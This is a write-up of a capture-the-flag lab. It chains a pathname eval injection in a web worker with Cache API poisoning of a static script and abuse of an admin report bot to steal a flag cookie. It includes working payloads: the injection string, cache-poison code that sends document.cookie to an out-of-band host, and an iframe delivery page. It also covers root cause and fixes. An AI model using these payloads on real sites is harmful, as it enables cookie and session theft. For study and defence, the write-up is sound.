# Simple Worker Pwnbox Lab - Worker Eval + SW Cache Poison

Date: 2026-07-09
Target type: CTF/lab
Bug class: Dedicated Worker `eval` injection, Cache API / Service Worker cache poisoning, admin report-bot abuse, same-browser-profile XSS escalation

## Observation

React SPA **Simple Worker** celebrating International Workers' Day.

Confirmed surface:

- Routes: `/` home, `/page/:slug` → article view (`Lh`), multi-segment paths → search/fallback (`Rh`)
- `Rh` creates `Worker("/static/utils-worker.js")` and posts `pathname`
- Worker builds `eval("page.title.indexOf('" + query + "') > -1 || ...")` — classic quote breakout
- `Lh` uses `dangerouslySetInnerHTML` on API `body` (API content is safe)
- Search cards render `title`/`body` as React text (escaped)
- Service Worker `/sw.js` cache name `contenthub-v1`, cache-first for `/static/*`
- `/static/app.js` only registers the SW
- Report: `POST /report` FormData `url`; bot is HeadlessChrome
- Report accepts **external** URLs (not same-origin only)

Instances worked:

- `901038c1e5b5.pwnbox-lab.com` (expired mid-solve)
- `6a04c44d7f92.pwnbox-lab.com` (expired mid-solve)
- `a3f30f31cbcc.pwnbox-lab.com` (solved)

## Hypothesis

1. Pathname injection into worker `eval` gives arbitrary JS in a dedicated worker.
2. Worker can `caches.open('contenthub-v1').put('/static/app.js', malicious Response)`.
3. Next full page load of the lab serves poisoned `/static/app.js` on the **main thread**, enabling `document.cookie` theft.
4. Separate bot visits use a **fresh browser profile**, so cache does not persist across two `/report` calls.
5. Same-session: external page iframes poison URL, then top-navigates to lab → cache survives → main-thread XSS.

## Failed Assumptions

- Forged search-card HTML XSS — React text context, no HTML sink.
- `javascript:` via slug path traversal (`../../javascript:...`) — SPA route only, no protocol execution.
- Worker `document.cookie` / `cookieStore` — unavailable in dedicated worker.
- Credentialed worker `fetch('/api/pages...')` — no admin-only flag pages; public content only.
- Two separate `/report` visits (stage1 poison, stage2 load) — **cache does not carry** across bot profiles.
- Chained `POST /report` during visit 1 without waiting — often `ignored` with ~9s cooldown.
- Chained report after 12s wait — stage2 queued, but still no `/d` hit in some runs (profile/timing).
- Async-only exfil (`fetch`/`sendBeacon`) on stage2 — bot may close before completion; prefer sync XHR + `location.replace`.

## Working Theory

Worker eval → Cache API poison of `/static/app.js` is real. Delivery must keep the **same browser profile**:

1. Host attacker HTML on Subkeeper (or any external host).
2. Report that external URL (bot allows it).
3. Attacker page iframes a multi-segment lab URL that triggers worker eval + cache poison.
4. After a short delay, `location.replace(labOrigin + '/')`.
5. Poisoned `/static/app.js` runs on main thread with boss cookies.

## Final Root Cause

`utils-worker.js` concatenates the decoded pathname into an `eval` string without escaping quotes. Dedicated workers share the origin Cache API with the page and SW. Poisoning `/static/app.js` turns a worker-only RCE into main-thread XSS on the next document load in that profile.

## Minimal Reproduction

Worker injection shape:

```text
/page/history/<id>-') > -1 || (EXPLOIT), ('
```

Cache poison (in worker):

```js
caches.open('contenthub-v1').then(c =>
  c.put('/static/app.js', new Response(
    "location.replace('https://[oast]/d?'+encodeURIComponent(JSON.stringify({c:document.cookie})));",
    {headers:{'Content-Type':'application/javascript'}}
  ))
)
```

Delivery page (external, reported to bot):

```html
<!doctype html>
<html><body>
<script>
(async () => {
  const ifr = document.createElement('iframe');
  ifr.src = 'https://[lab]/page/history/...poison...';
  document.body.appendChild(ifr);
  await new Promise(r => setTimeout(r, 4000));
  location.replace('https://[lab]/');
})();
</script>
</body></html>
```

## Why Failed Payloads Failed

| Attempt | Why |
|---------|-----|
| Two `/report` visits | Fresh bot profile each visit; Cache API empty |
| Worker cookie read | No DOM / cookieStore in dedicated worker |
| Forged HTML cards | React text nodes, not HTML |
| External script in poison | Unnecessary; inline sync + `location.replace` is enough |

## Why Working Test Worked

Iframe poison and top navigation share one HeadlessChrome profile. SW cache-first serves poisoned `/static/app.js` on the second navigation. Main-thread `document.cookie` contained `flag=pwnbox{...}`.

## Fix

- Stop using `eval` for search; use `String.prototype.includes` / indexOf without string concat into code.
- Do not expose Cache API writes from untrusted worker input; prefer SW-only cache control.
- Scope report bot to same-origin URLs if external pages are not required.
- Prefer HttpOnly for session cookies (flag cookie here was readable from JS).

## Future Checklist Item

When a report bot accepts external URLs **and** the app has SW/Cache API + worker/page XSS:

1. Confirm worker/page can write Cache API.
2. Confirm separate bot visits reset profile.
3. Prefer same-session iframe poison → top navigate over multi-report staging.
